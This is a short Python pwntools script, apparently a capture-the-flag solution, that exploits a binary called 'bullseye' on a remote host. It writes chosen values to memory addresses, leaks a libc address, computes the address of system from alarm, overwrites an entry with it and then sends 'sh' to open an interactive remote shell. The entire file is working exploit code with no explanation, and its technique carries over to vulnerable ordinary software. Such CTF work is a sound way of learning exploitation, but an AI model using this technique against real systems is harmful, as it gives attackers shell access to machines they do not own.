from pwn import *

elf = ELF('./bullseye')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = remote('jh2i.com', 50031)
#p = process('./bullseye')

print p.recv()
p.sendline(str(404058))
print p.recv()
p.sendline(str(401260))
a = p.recv()
print a
pwn = hex(int(a.split()[0],16)-libc.sym['alarm']+libc.sym['system'])[2:]
p.sendline(str(404060))
print p.recv()
p.sendline(str(401260))
print p.recv()
p.sendline(str(404040))
print p.recv()
p.sendline(pwn)
print p.recv()
p.sendline('sh')
p.interactive()
